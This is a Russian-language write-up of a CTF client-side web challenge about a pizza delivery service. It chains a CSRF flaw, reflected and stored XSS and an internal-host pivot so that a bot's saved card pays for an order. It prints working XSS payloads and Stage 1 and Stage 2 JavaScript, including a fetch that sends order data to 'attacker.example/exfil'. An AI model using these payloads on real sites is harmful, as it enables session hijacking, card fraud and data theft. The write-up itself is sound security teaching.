# Гиростабилизированная пицца

**Категория:** Web (Clientside)
**URL:** `https://landing-gyropizza-15dpj46z.alfactf.ru/` · бот `https://bot-gyropizza-15dpj46z.alfactf.ru/`
**Флаг:** `alfa{1M_G0ING_CR4zy_OV3r_TH15_pIzz4}`

## Условие

В городе открылась новая пиццерия. Владелец — уважаемый в нашей тусовке человек, и в этом месяце с каждым заказом приезжают редкие EDC-аксессуары. Один негодяй забрал заказ автора, и нужно «восстановить справедливость» — оплатить с его карточки самый дорогой товар.

**Вложения:** [`gyropizza_acc3cd3.tar.gz`](./files/gyropizza_acc3cd3.tar.gz)

Решений на платформе во время CTF: **0**.

---

## Анализ системы

Сервис состоит из четырёх компонент в одном `docker-compose`:

| Компонент | Стек | Роль |
|---|---|---|
| `landing` | PHP 8.0 + Apache | лендинг с формой обратного звонка |
| `backend` | Go | API для landing и delivery (`/api/landing/callback`, `/api/addresses`, `/api/orders`, `/api/cards`) |
| `frontend` | React SPA | приложение доставки (`delivery-*`) |
| `bot` | Selenium + headless Chrome 148 | регистрирует юзера, добавляет адрес, оформляет тестовый заказ, **сохраняет карту**, затем посещает URL атакующего |

Ключевой нюанс инфраструктуры — **внутренние docker-aliases** в bot-контейнере (`docker-compose.yml`):

```yaml
networks:
  default:
    aliases:
      - delivery.alfactf.local
      - landing.alfactf.local
      - bot.alfactf.local
```

То есть из браузера бота резолвятся не только публичные `*-gyropizza-*.alfactf.ru` за прокси, но и **внутренние** `landing.alfactf.local` / `delivery.alfactf.local` напрямую к бэкендам. Это окажется важным.

### Цель

В меню есть `FLAG pizza` за 9900 копеек. `backend/internal/handlers/orders.go` отдаёт поле `flag` в ответе `GET /api/orders/{id}` только если order.status = `paid`. Чтобы статус стал `paid`, нужна валидация карты — `validate.CardMatches` строго сравнивает `Number/Exp/CVC/Holder` с прод-ENV (дефолты `4242…/12/30/123/JOHN DOE` в проде НЕ выставлены, перебор не проходит).

Единственный путь — **сесть в сессию бота** и оформить заказ его сохранённой картой через `saved_card_id`.

---

## Уязвимость 1: Set-Cookie до проверки CSRF

`backend/internal/handlers/landing.go`, обработчик `/api/landing/callback`:

```go
phone := strings.TrimSpace(r.PostFormValue("phone"))
if phone != "" {
    h.setLandingPhoneCookie(w, phone)   // ← cookie ставится ДО проверки
}
csrfToken := r.PostFormValue("csrf_token")
csrfCookie, err := r.Cookie("landing_csrf")
if err != nil || csrfToken == "" || csrfCookie == nil ||
   csrfCookie.Value == "" || csrfToken != csrfCookie.Value {
    redirectLandingCallback(w, r, "csrf")   // редирект на /?callback=csrf
    return
}
```

Даже с заведомо невалидным CSRF-токеном backend сначала кладёт произвольное значение в cookie `landing_phone`, и только потом отвергает запрос. Редирект ведёт на `/?callback=csrf#callback`, где этот cookie рендерится в HTML.

## Уязвимость 2: Reflected XSS на лендинге через `htmlspecialchars`

`landing/index.php`:

```php
if (!empty($_COOKIE['landing_phone'])) {
    $phoneValue = rawurldecode($_COOKIE['landing_phone']);
}
// …
?>
<input type='tel' name='phone' value='<?php echo htmlspecialchars($phoneValue); ?>' required />
```

PHP **8.0**: дефолтные флаги `htmlspecialchars` — `ENT_COMPAT | ENT_HTML401`. `ENT_COMPAT` экранирует только `"`, **одинарную кавычку оставляет**. Дефолт сменился на `ENT_QUOTES` только в PHP 8.1.

Атрибут `value` обёрнут в одинарные кавычки → `'` ломает атрибут → инъекция произвольных HTML-атрибутов. Тривиальный `autofocus onfocus` не работает: после редиректа URL содержит fragment `#callback`, и Chrome блокирует автофокус. Стабильный триггер — пристроиться к существующей CSS-анимации `shimmer` на лендинге:

```html
' id=PAYLOAD_BASE64 style=animation-name:shimmer;animation-duration:1s
  onanimationstart=eval(atob(this.id)) x='
```

## Уязвимость 3: Stored XSS в delivery через `address.label`

`frontend/src/components/AddressBlock.jsx`:

```jsx
node.innerHTML = `<strong>${address.label}</strong>` + /* … */;
```

Бэкенд сохраняет `label` без санитайза, а фронтенд рендерит через `innerHTML`. Через `POST /api/addresses` можно положить адрес со злым label:

```html
</strong><img src=x onerror=eval(atob(this.dataset.x)) data-x=BASE64_STAGE2><strong>
```

Когда SPA на `/addresses` отрисует список адресов сессии, XSS выполнится в origin `delivery.*` и получит SOP-доступ ко всему API — `/api/cards`, `/api/menu`, `/api/orders`.

`Content-Type: text/plain` достаточно: Go-декодер JSON в backend не строгий по типу, и `text/plain` не вызывает CORS preflight, так что cross-origin POST с `credentials: include` улетает напрямую.

---

## Решение

### Архитектура цепочки

```
[attacker.html на HTTPS-хосте]
    │  Sandboxed iframe srcdoc + form target=_top
    ▼
POST http://landing.alfactf.local/api/landing/callback
    │  Set-Cookie: landing_phone=<XSS payload>
    │  → 303 → /?callback=csrf#callback
    ▼
[XSS на landing.alfactf.local]
    │  Stage 1: cross-origin POST с credentials:include
    ▼
POST http://delivery.alfactf.local/api/addresses
    │  body: {"label": "<img src=x onerror=...>"}
    │  ← cookies клеятся: same-site (alfactf.local)
    ▼
top.location = http://delivery.alfactf.local/addresses
    │
    ▼
[Stored XSS в delivery.alfactf.local]
    │  Stage 2: same-origin fetch ко всему API
    ▼
POST /api/orders { items:[{pizza_id: FLAG_PIZZA, qty:1}],
                   payment_method:"card", saved_card_id: <бот'овская> }
    │
    ▼
GET /api/orders/{id}  → JSON с полем "flag"
    │
    ▼
exfil → attacker listener
```

### 1. Mixed-content bypass: HTTPS-страница → HTTP-форма

Бот ходит только по `http(s)`-URL, удобные хостинги (litterbox/catbox) отдают payload через HTTPS. Прямой `<form action="http://landing.alfactf.local/...">` со страницы по HTTPS Chrome блокирует как mixed-content insecure form.

Обход — **sandboxed iframe с `srcdoc`** + `target="_top"`. Mixed-content guard проверяет origin фрейма (он `about:srcdoc`), а не родителя:

```html
<iframe sandbox="allow-scripts allow-forms allow-top-navigation" srcdoc='
  <!doctype html>
  <form id="f" target="_top" method="POST"
        action="http://landing.alfactf.local/api/landing/callback">
    <input type="hidden" name="phone"   value="<XSS_PAYLOAD>">
    <input type="hidden" name="csrf_token" value="x">
  </form>
  <script>setTimeout(() => f.submit(), 100)</script>
'></iframe>
```

После `f.submit()` происходит top-level navigation на `http://landing.alfactf.local/...`. Это GET (после 303 redirect), где Lax-куки клеятся идеально.

### 2. Stage 1: создание злого адреса от имени бота

XSS на лендинге грузит Stage 1 (он лежит на нашем listener'е, потому что cookie `landing_phone` ограничен 4 KB и весь payload в него не помещается):

```js
// Stage 1 — выполняется в origin landing.alfactf.local
const STAGE2_B64 = "..."; // base64 от Stage 2 (см. ниже)
const evilLabel =
  `</strong><img src=x onerror=eval(atob(this.dataset.x)) ` +
  `data-x=${STAGE2_B64}><strong>`;

// cross-origin same-site: куки бота приедут (alfactf.local — общий eTLD+1)
await fetch('http://delivery.alfactf.local/api/addresses', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({
    label: evilLabel,
    city: 'M', street: 'S', house: '1',
  }),
});

// top-level навигация — Lax-куки бота снова клеятся
top.location.replace('http://delivery.alfactf.local/addresses');
```

### 3. Stage 2: заказ FLAG-пиццы и эксфильтрация

Выполняется в origin `delivery.alfactf.local`, где у нас полный SOP-доступ к API сессии бота:

```js
const EXFIL = 'https://attacker.example/exfil';

const menu = await fetch('/api/menu').then(r => r.json());
const flagPizza = menu.items.find(i => i.name === 'FLAG pizza');

const addrs = (await fetch('/api/addresses').then(r => r.json())).addresses;
const cards = (await fetch('/api/cards').then(r => r.json())).cards;

const order = await fetch('/api/orders', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    address_id: addrs[0].id,
    items: [{pizza_id: flagPizza.id, quantity: 1}],
    payment_method: 'card',
    saved_card_id: cards[0].id,    // карта, которую бот сохранил при регистрации
    card: null,
  }),
}).then(r => r.json());

const detail = await fetch('/api/orders/' + order.order.id).then(r => r.text());
fetch(EXFIL, {method: 'POST', mode: 'no-cors', body: detail});
```

### 4. Доставка через бота

Готовая `attacker.html` хостится на любом HTTPS-хосте (мы пробовали свои `srv-01:8443` и litterbox). В UI бота (`bot-gyropizza-*/`) сабмитим её URL вместе с reCAPTCHA-токеном — на стенде используется тестовый sitekey, который пропускает любой токен. Бот заходит на страницу, цепочка отрабатывает примерно за 2-3 секунды (хорошо укладывается в `BOT_VISIT_SECONDS=5`), и listener получает JSON с флагом:

```json
{
  "order": {
    "id": "cb297663-d1fa-4cd0-8944-1e7443a34b67",
    "status": "paid",
    "total_cents": 9900,
    "flag": "alfa{1M_G0ING_CR4zy_OV3r_TH15_pIzz4}"
  }
}
```

---

## Главный гочи: внутренние хосты вместо публичных

Это главная причина, почему 0 команд решили задачу за 12 часов CTF. Естественный первый инстинкт — атаковать **публичные** домены:

```
landing-gyropizza-15dpj46z.alfactf.ru
delivery-gyropizza-15dpj46z.alfactf.ru
```

Они **same-site по spec** (общий eTLD+1 = `alfactf.ru`, `alfactf.ru` отсутствует в Public Suffix List). Lax-куки **обязаны** клеиться. На наших probe-стендах (Chrome 145/147/148-beta) цепочка проходила end-to-end. Но в реальной инфре бота cross-origin same-site POST'ы получали 401 — куки не прицеплялись **ни одним методом**: ни fetch, ни iframe-form-POST, ни XHR, ни popup top-level POST.

Гипотеза: между Chrome бота и бэкендом стоит прокси (Cloudflare-like, в response заголовках были видны `__cfduid` / `Sec-CH-Cloudflare`), который фильтрует cookies на cross-origin запросах. Curl с тестового хоста с явно подставленным `Origin: landing-…` всё равно проходил — то есть прокси не режет на сетевом уровне сами cookies, а навешивает Chrome-side политику через какой-то заголовок/CDP-флаг.

Решение — **обойти прокси целиком**. У бота в `/etc/hosts` (через docker-network aliases) резолвятся:

```
landing.alfactf.local
delivery.alfactf.local
```

Это плоский HTTP, минуя весь edge-прокси. И что важно — у них общий eTLD+1 = `alfactf.local`, тоже same-site, Lax-куки клеятся беспроблемно. Внешняя `attacker.html` подсовывает форму, целящуюся **сразу во внутренний** `landing.alfactf.local` — Chrome бота резолвит хост через docker-DNS и идёт напрямую.

После CTF мы сверили теорию по исходникам:

```python
# bot/common.py
LOCAL_DOMAIN_SUFFIX = os.getenv('LOCAL_DOMAIN_SUFFIX', '').strip()

def default_delivery_base():
    suffix = LOCAL_DOMAIN_SUFFIX.lstrip('.')
    if suffix:
        return f"http://{DELIVERY_LOCAL_PREFIX}.{suffix}"
```

И в `docker-compose.yml`:

```yaml
LOCAL_DOMAIN_SUFFIX: ${LOCAL_DOMAIN_SUFFIX:-alfactf.local}
```

То есть автор задачи **прямым текстом** в исходниках указал внутренний домен. Это и был интендед-вектор — задача проектировалась под чистую same-site среду без прокси. Мы это видели, но не пытались адресовать payload именно на эти хосты.

---

## Ретроспектива: тупик с `saved_card_id`

Параллельно мы исследовали два других вектора, которые оказались тупиковыми и стоит зафиксировать:

1. **Hijack `delivery_access_token` через `/api/auth/login`**. Открытие: response `Set-Cookie` от cross-origin `mode:'no-cors'` fetch обрабатывается браузером и перезаписывает existing JWT cookie — даже без `credentials` в request. Это позволяло «подложить» бота нашу сессию: `top.location.replace('/addresses')` грузил SPA уже как **наш** юзер, который видел свой XSS-laden адрес и отрабатывал Stage 2. Но в этой сессии нет `saved_card`, а валидация карты в `validate.CardMatches` требует точного совпадения с прод-ENV (`VALID_CARD_NUMBER/EXP/CVC/HOLDER`). Без знания этих ENV или без бот'овского `saved_card_id` заказ не проходит как `paid`, флаг недоступен. Вектор интересный сам по себе (через `landing-*/api/auth/register` → nginx прокси → `delivery-*` Set-Cookie), но не закрывает задачу.

2. **Брутфорс ENV-карты**. ~9k комбинаций common test-cards × CTF-themed holders — все `card_invalid`. Прод выставлен на нестандартные значения, утечки через source-code review нет. Тупик по дизайну.

Итого: `bootstrap_fired` мы получали и на реальном боте (через hijack), но в нужную сессию **бота** садились только в локальном стенде. Не хватило одного клика — поменять домен пейлоада на `*.alfactf.local`.

---

## Технические детали

**Ключевые файлы исходников:**
- `backend/internal/handlers/landing.go` — Set-Cookie до CSRF-проверки.
- `landing/index.php` — рендер `value='…'` через `htmlspecialchars` без `ENT_QUOTES`.
- `frontend/src/components/AddressBlock.jsx` — `innerHTML` от `address.label`.
- `bot/common.py` + `docker-compose.yml` — резолв `*.alfactf.local` внутри bot-network.
- `backend/internal/handlers/orders.go` — `flag` отдаётся в ответе для `paid`-заказа.

**Цепочка уязвимостей:**
1. CSRF-bypass на `/api/landing/callback` (cookie до проверки токена).
2. Reflected XSS через `landing_phone` cookie на PHP 8.0 (`htmlspecialchars` не экранирует `'`).
3. Stored XSS через `address.label` в React-фронтенде (`innerHTML`).
4. Pivot landing → delivery поверх внутренних `*.alfactf.local` хостов для корректной same-site cookie attachment.
5. Mixed-content bypass через `<iframe sandbox srcdoc>` для перехода с HTTPS-attacker.html на HTTP `*.alfactf.local`.

**Что осталось в нашем репо** (`tasks-2026/gyropizza/solve/`):
- `build_exploit.py`, `exploit*.html`, `stage1*.js`, `inner_payload.js` — наши версии цепочки против публичных доменов (cookie attachment блокировался).
- `setup_xss_user.py` — регистрация hijack-юзера и плант XSS-адреса (ход через перезапись JWT).
- `listener.py` — HTTPS-listener для exfil.
- `chrome147_probe.py`, `chrome148_probe.py` — Playwright-зонды против разных версий Chrome для отладки cookie behavior.
- `PROGRESS.md`, `NOTES.md` — полная хронология попыток и наших находок 25 апреля.
